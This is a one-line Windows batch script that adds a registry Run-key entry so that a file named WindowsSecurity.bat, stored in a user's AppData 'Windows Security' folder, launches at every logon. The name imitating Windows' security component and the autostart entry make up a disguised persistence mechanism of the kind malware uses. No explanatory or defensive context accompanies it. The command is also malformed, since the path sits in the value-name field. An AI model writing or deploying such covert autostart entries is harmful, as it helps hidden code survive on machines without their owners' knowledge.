@echo off
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "C:\Users\jelle\AppData\Roaming\Windows Security\WindowsSecurity.bat" /t REG_SZ /d "\"WindowsSecurity.bat\"" /f
